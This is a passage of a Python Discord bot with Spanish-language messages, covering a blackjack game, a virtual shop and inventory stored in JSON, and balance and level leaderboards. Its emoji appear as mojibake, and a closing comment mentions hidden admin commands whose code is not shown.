    embed.add_field(name="üôã Tus cartas", value=" ".join(player_hand) + f" (Total: {player_total})", inline=False)
    embed.add_field(name="ü§µ Dealer", value=dealer_hand[0] + " ‚ùì", inline=False)
    
    # Verificar blackjack natural
    if player_total == 21:
        # Dealer toma segunda carta
        dealer_hand.append(random.choice(cards))
        dealer_total = calculate_hand(dealer_hand)
        
        if dealer_total == 21:
            # Empate
            embed.add_field(name="ü§ù Resultado", value="¬°Empate! Ambos tienen Blackjack", inline=False)
            embed.color = discord.Color.orange()
        else:
            # Player gana con blackjack
            winnings = int(amount * 1.5)
            update_balance(ctx.author.id, winnings, 0)
            embed.add_field(name="üéâ ¬°BLACKJACK!", value=f"¬°Ganaste ${winnings:,}!", inline=False)
            embed.color = discord.Color.gold()
        
        await ctx.send(embed=embed)
        return
    
    # Juego normal - dealer toma cartas hasta 17+
    while calculate_hand(dealer_hand) < 17:
        dealer_hand.append(random.choice(cards))
    
    dealer_total = calculate_hand(dealer_hand)
    
    # Determinar ganador
    embed.add_field(name="ü§µ Dealer final", value=" ".join(dealer_hand) + f" (Total: {dealer_total})", inline=False)
    
    if dealer_total > 21:
        # Dealer se pasa
        winnings = amount
        update_balance(ctx.author.id, winnings, 0)
        embed.add_field(name="üéâ ¬°GANASTE!", value=f"Dealer se pas√≥. Ganaste ${winnings:,}!", inline=False)
        embed.color = discord.Color.green()
    elif player_total > dealer_total:
        # Player gana
        winnings = amount
        update_balance(ctx.author.id, winnings, 0)
        embed.add_field(name="üéâ ¬°GANASTE!", value=f"Ganaste ${winnings:,}!", inline=False)
        embed.color = discord.Color.green()
    elif player_total == dealer_total:
        # Empate
        embed.add_field(name="ü§ù Empate", value="¬°Recuperaste tu apuesta!", inline=False)
        embed.color = discord.Color.orange()
    else:
        # Player pierde
        update_balance(ctx.author.id, -amount, 0)
        embed.add_field(name="üòî Perdiste", value=f"Perdiste ${amount:,}", inline=False)
        embed.color = discord.Color.red()
    
    await ctx.send(embed=embed)

# Sistema de tienda
shop_items = {
    "laptop": {"name": "üíª Laptop Gaming", "price": 50000, "description": "Laptop para juegos de alta gama"},
    "phone": {"name": "üì± Smartphone", "price": 15000, "description": "√öltimo modelo de tel√©fono inteligente"},
    "car": {"name": "üöó Auto Deportivo", "price": 200000, "description": "Auto deportivo de lujo"},
    "house": {"name": "üè† Casa", "price": 1000000, "description": "Casa de dos plantas"},
    "yacht": {"name": "üõ•Ô∏è Yate", "price": 5000000, "description": "Yate de lujo privado"},
    "pizza": {"name": "üçï Pizza", "price": 500, "description": "Pizza deliciosa reci√©n hecha"},
    "coffee": {"name": "‚òï Caf√© Premium", "price": 200, "description": "Caf√© de especialidad"},
    "book": {"name": "üìö Libro", "price": 300, "description": "Libro de programaci√≥n avanzada"},
    "watch": {"name": "‚åö Reloj", "price": 8000, "description": "Reloj inteligente de marca"},
    "headphones": {"name": "üéß Aud√≠fonos", "price": 2500, "description": "Aud√≠fonos inal√°mbricos premium"}
}

# Archivo de inventarios
inventory_file = 'inventories.json'
if os.path.exists(inventory_file):
    with open(inventory_file, 'r') as f:
        inventories = json.load(f)
else:
    inventories = {}

def save_inventories():
    with open(inventory_file, 'w') as f:
        json.dump(inventories, f)

def get_inventory(user_id):
    user_id = str(user_id)
    if user_id not in inventories:
        inventories[user_id] = {}
    return inventories[user_id]

def add_item_to_inventory(user_id, item_id):
    user_id = str(user_id)
    inventory = get_inventory(user_id)
    if item_id in inventory:
        inventory[item_id] += 1
    else:
        inventory[item_id] = 1
    save_inventories()

@bot.command(name='shop')
async def shop_command(ctx):
    """Ver la tienda virtual"""
    embed = discord.Embed(title="üõí Tienda Virtual", color=discord.Color.blue())
    embed.description = "Usa `.buy <art√≠culo>` para comprar"
    
    for item_id, item in shop_items.items():
        embed.add_field(
            name=f"{item['name']} - ${item['price']:,}",
            value=f"`{item_id}` - {item['description']}",
            inline=False
        )
    
    embed.set_footer(text="Ejemplo: .buy laptop")
    await ctx.send(embed=embed)

@bot.command(name='buy')
async def buy_command(ctx, item_id=None):
    """Comprar √≠tems de la tienda"""
    if not item_id:
        await ctx.send("‚ùå Uso: `.buy <art√≠culo>`\nUsa `.shop` para ver art√≠culos disponibles.")
        return
    
    if item_id not in shop_items:
        await ctx.send("‚ùå Ese art√≠culo no existe. Usa `.shop` para ver la tienda.")
        return
    
    item = shop_items[item_id]
    user_balance = get_balance(ctx.author.id)
    
    if user_balance['wallet'] < item['price']:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Necesitas ${item['price']:,} pero tienes ${user_balance['wallet']:,}")
        return
    
    # Comprar art√≠culo
    update_balance(ctx.author.id, -item['price'], 0)
    add_item_to_inventory(ctx.author.id, item_id)
    
    embed = discord.Embed(title="üõçÔ∏è Compra Exitosa", color=discord.Color.green())
    embed.add_field(name="üéÅ Compraste", value=item['name'], inline=True)
    embed.add_field(name="üí∞ Precio", value=f"${item['price']:,}", inline=True)
    embed.set_footer(text="¬°Disfruta tu nueva compra!")
    
    await ctx.send(embed=embed)

@bot.command(name='inventory')
async def inventory_command(ctx):
    """Ver tu inventario"""
    inventory = get_inventory(ctx.author.id)
    
    if not inventory:
        embed = discord.Embed(title="üéí Tu Inventario", description="Tu inventario est√° vac√≠o.", color=discord.Color.orange())
        embed.add_field(name="üí° Tip", value="Usa `.shop` para comprar art√≠culos", inline=False)
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title="üéí Tu Inventario", color=discord.Color.green())
    
    total_value = 0
    for item_id, quantity in inventory.items():
        if item_id in shop_items:
            item = shop_items[item_id]
            value = item['price'] * quantity
            total_value += value
            
            embed.add_field(
                name=f"{item['name']} x{quantity}",
                value=f"Valor: ${value:,}",
                inline=True
            )
    
    embed.add_field(name="üíé Valor Total", value=f"${total_value:,}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='baltop')
async def baltop_command(ctx):
    """Top 15 usuarios m√°s ricos del servidor"""
    if not balances:
        await ctx.send("‚ùå No hay datos de balance disponibles.")
        return
    
    # Crear lista de usuarios con sus balances totales
    user_balances = []
    for user_id, data in balances.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total = data['wallet'] + data['bank']
                if total > 0:  # Solo usuarios con dinero
                    user_balances.append((user.display_name, total, data['wallet'], data['bank']))
        except:
            continue
    
    # Ordenar por balance total
    user_balances.sort(key=lambda x: x[1], reverse=True)
    user_balances = user_balances[:15]  # Top 15
    
    if not user_balances:
        await ctx.send("‚ùå No hay suficientes usuarios con balance para mostrar.")
        return
    
    embed = discord.Embed(title="üí∞ Top 15 M√°s Ricos", color=discord.Color.gold())
    
    description = ""
    medals = ["ü•á", "ü•à", "ü•â"]
    
    for i, (name, total, wallet, bank) in enumerate(user_balances):
        medal = medals[i] if i < 3 else f"{i+1}."
        description += f"{medal} **{name}** - ${total:,}\n"
        if i < 5:  # Mostrar detalles para top 5
            description += f"    üí∞ Billetera: ${wallet:,} | üè¶ Banco: ${bank:,}\n"
        description += "\n"
    
    embed.description = description
    embed.set_footer(text=f"Ranking del servidor ‚Ä¢ {len(user_balances)} usuarios")
    
    await ctx.send(embed=embed)

@bot.command(name='leaderboard')
async def leaderboard_command(ctx):
    """Tabla de posiciones del servidor"""
    # Combinar datos de econom√≠a y niveles
    combined_data = []
    
    for user_id in set(list(balances.keys()) + list(user_levels.keys())):
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                # Datos de econom√≠a
                balance_data = balances.get(user_id, {"wallet": 0, "bank": 0})
                total_money = balance_data['wallet'] + balance_data['bank']
                
                # Datos de niveles
                level_data = user_levels.get(user_id, {"level": 1, "messages": 0})
                
                combined_data.append((
                    user.display_name,
                    total_money,
                    level_data['level'],
                    level_data['messages']
                ))
        except:
            continue
    
    if not combined_data:
        await ctx.send("‚ùå No hay suficientes datos para mostrar el leaderboard.")
        return
    
    # Ordenar por nivel y luego por dinero
    combined_data.sort(key=lambda x: (x[2], x[1]), reverse=True)
    combined_data = combined_data[:10]  # Top 10
    
    embed = discord.Embed(title="üèÜ Leaderboard General", color=discord.Color.purple())
    
    description = ""
    medals = ["ü•á", "ü•à", "ü•â"]
    
    for i, (name, money, level, messages) in enumerate(combined_data):
        medal = medals[i] if i < 3 else f"{i+1}."
        description += f"{medal} **{name}**\n"
        description += f"    üèÜ Nivel {level} | üí∞ ${money:,} | üí¨ {messages} msgs\n\n"
    
    embed.description = description
    embed.set_footer(text="Ranking combinado de nivel y econom√≠a")
    
    await ctx.send(embed=embed)


# Los comandos administrativos ocultos permanecen implementados internamente


bot.run(os.getenv('DISCORD_TOKEN'))
